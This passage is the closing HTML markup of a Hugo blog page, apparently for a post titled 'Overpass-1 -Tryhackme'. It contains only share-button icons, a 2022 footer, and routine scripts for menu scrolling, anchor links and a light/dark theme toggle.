/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Overpass-1 -Tryhackme on whatsapp" href="https://api.whatsapp.com/send?text=Overpass-1%20-Tryhackme%20-%20https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23-13.314-11.876-22.304-26.542-24.916-31.026s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Overpass-1 -Tryhackme on telegram" href="https://telegram.me/share/url?text=Overpass-1%20-Tryhackme&url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47A3.38 3.38.0 0126.49 29.86zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z" /></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://akhils911dev.github.io/blog/>As-Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><script>let menu=document.getElementById('menu')
if(menu){menu.scrollLeft=localStorage.getItem("menu-scroll-position");menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft);}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>